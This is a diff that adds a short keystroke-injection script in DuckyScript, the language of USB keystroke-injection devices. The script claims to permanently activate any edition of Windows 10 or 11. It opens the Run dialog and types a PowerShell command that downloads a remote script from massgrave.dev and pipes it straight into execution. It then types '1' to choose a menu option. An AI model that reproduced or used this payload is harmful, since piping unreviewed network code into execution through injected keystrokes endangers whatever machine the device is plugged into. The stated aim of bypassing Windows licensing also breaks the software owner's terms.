@@ -1,0 +1,9 @@
+REM Simple script to activate windows 10 or 11 of any flavor permanently.
+GUI r
+DELAY 100
+STRING powershell iwr -useb https://massgrave.dev/get | iex
+ENTER
+REM This delay may need to be adjusted longer depending on internet and computer speed.
+DELAY 10000
+STRING 1
+ENTER
